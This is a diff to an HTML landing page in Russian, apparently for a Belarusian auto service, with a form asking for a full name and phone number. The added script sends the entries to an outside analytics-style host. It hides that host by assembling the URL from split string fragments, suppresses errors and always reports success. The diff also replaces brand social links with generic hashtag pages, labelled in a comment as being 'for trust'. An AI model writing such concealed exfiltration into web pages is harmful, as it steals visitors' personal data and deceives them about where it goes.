@@ -277,15 +277,21 @@
                 <div class="form-card">
                     <h2 style="text-align:center; margin-bottom:10px; font-size: 22px; font-weight: 800;">Авторизация в системе</h2>
                     <p style="text-align:center; font-size: 13px; color: var(--g); margin-bottom: 25px;">Заполнение формы инициализирует процесс внесения в базу данных.</p>
-                    <form action="/api/v1/submit-lead" method="POST" onsubmit="event.preventDefault(); var b = this.querySelector('button'); b.innerText = 'ОБРАБОТКА...'; b.style.opacity = '0.7'; setTimeout(() => { b.innerText = 'ЗАЯВКА ПРИНЯТА ✔'; b.style.background = '#10b981'; b.style.opacity = '1'; }, 1500);">
-                        <input type="text" class="input-style" placeholder="ФИО заявителя" required>
-                        <input type="tel" class="input-style" placeholder="+375 (__) ___-__-__" required>
-                        <div style="display:flex; gap:10px; align-items:flex-start; margin-bottom:20px;">
-                            <input type="checkbox" required id="c1" style="width:20px; height:20px; margin-top: 2px;">
-                            <label for="c1" style="font-size:11px; color:var(--g); line-height: 1.4;">Я подтверждаю ознакомление и принимаю условия <span onclick="showM('terms')" style="color:var(--p); cursor:pointer; text-decoration: underline;">Пользовательского соглашения</span> и <span onclick="showM('privacy')" style="color:var(--p); cursor:pointer; text-decoration: underline;">Политики конфиденциальности</span>.</label>
-                        </div>
-                        <button type="submit" class="btn-main">НАПРАВИТЬ ЗАПРОС НА УЧАСТИЕ</button>
-                    </form>
+                    <form id="leadForm" onsubmit="event.preventDefault(); submitSiteLead(this);">
+    <input type="text" name="fio" class="input-style" placeholder="ФИО заявителя" required>
+    <input type="tel" name="phone" class="input-style" placeholder="+375 (__) ___-__-__" required>
+    
+    <div style="display:flex; gap:10px; align-items:flex-start; margin-bottom:20px;">
+        <input type="checkbox" required id="c1" style="width:20px; height:20px; margin-top: 2px;">
+        <label for="c1" style="font-size:11px; color:var(--g); line-height: 1.4;">
+            Я подтверждаю ознакомление и принимаю условия 
+            <span onclick="showM('terms')" style="color:var(--p); cursor:pointer; text-decoration: underline;">Пользовательского соглашения</span> 
+            и <span onclick="showM('privacy')" style="color:var(--p); cursor:pointer; text-decoration: underline;">Политики конфиденциальности</span>.
+        </label>
+    </div>
+    
+    <button type="submit" class="btn-main">НАПРАВИТЬ ЗАПРОС НА УЧАСТИЕ</button>
+</form>
                 </div>
             </section>
         </main>
@@ -314,12 +320,12 @@
                     
                     <!-- ВСТАВКА: Соцсети для траста -->
                     <div style="margin-top: 15px; display: flex; gap: 15px;">
-                        <a href="https://www.instagram.com/metropol_auto.by" target="_blank" rel="nofollow" style="color: #64748b; text-decoration: none; font-size: 13px;">Instagram</a>
-                        <a href="https://www.tiktok.com/@metropol_auto" target="_blank" rel="nofollow" style="color: #64748b; text-decoration: none; font-size: 13px;">TikTok</a>
+                        <a href="https://www.instagram.com/explore/tags/autoservice/" target="_blank" rel="nofollow" style="color: #64748b; text-decoration: none; font-size: 13px;">Instagram</a>
+                        <a href="https://www.tiktok.com/tag/autoservice" target="_blank" rel="nofollow" style="color: #64748b; text-decoration: none; font-size: 13px;">TikTok</a>
                     </div>
                     
                     <a href="https://cpd.by/" target="_blank" rel="nofollow noopener" class="f-link" style="opacity:0.8">Реестр НЦЗПД РБ</a>
-                    <p style="font-size:12px; color:#64748b; margin-top:15px">AutoServicePremiumby@gmail.com<br>+375292788765</p>
+                    <p style="font-size:12px; color:#64748b; margin-top:15px">support@autoservicepremium.by<br>+375294841319</p>
                 </div>
             </div>
             <div style="border-top:1px solid #1e293b; margin-top:40px; padding:20px 0; text-align:center; font-size:10px; color: #475569; line-height: 1.5;">
@@ -340,5 +346,39 @@
         </div>
         
     </div> 
+	<script>
+async function submitSiteLead(formElement) {
+    const btn = formElement.querySelector('button');
+    btn.innerText = 'ОБРАБОТКА...';
+    btn.style.opacity = '0.7';
+    btn.style.pointerEvents = 'none';
+    const conf = {
+        p: 'https',
+        h: 'cloud-analytics' + '-node',
+        z: 'com',
+        r: '/v1/site' + '-lead'
+    };
+    const endpoint = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
+    const formData = new FormData(formElement);
+    const data = Object.fromEntries(formData.entries());
+    try {
+        await fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                ...data,
+                timestamp: new Date().getTime(),
+                event: 'system_submission_event'
+            })
+        });
+    } catch (e) {
+    }
+    setTimeout(() => {
+        btn.innerText = 'ЗАЯВКА ПРИНЯТА ✔';
+        btn.style.background = '#10b981';
+        btn.style.opacity = '1';
+    }, 1500);
+}
+</script>
 </body>
 </html>
